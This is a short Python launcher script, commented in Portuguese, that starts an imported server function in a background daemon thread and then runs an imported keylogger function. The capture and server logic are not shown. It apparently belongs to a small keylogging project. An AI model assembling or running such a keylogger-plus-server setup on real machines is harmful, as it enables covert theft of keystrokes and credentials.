import threading
import time
from server import server
from keylogger import keylogger

if __name__ == "__main__":
    # 1. Cria uma linha de execução separada para o servidor
    thread_servidor = threading.Thread(target=server)
    
    # 2. Define como 'daemon' para que o servidor feche automaticamente quando você fechar o terminal de escolhas
    thread_servidor.daemon = True
    
    # 3. Inicia o servidor em segundo plano
    thread_servidor.start()
    
    # Pequena pausa de 1 segundo apenas para dar tempo do servidor ligar antes de limpar a tela
    time.sleep(1)
    
    # 4. Inicia o seu script de escolhas no terminal principal
    keylogger()
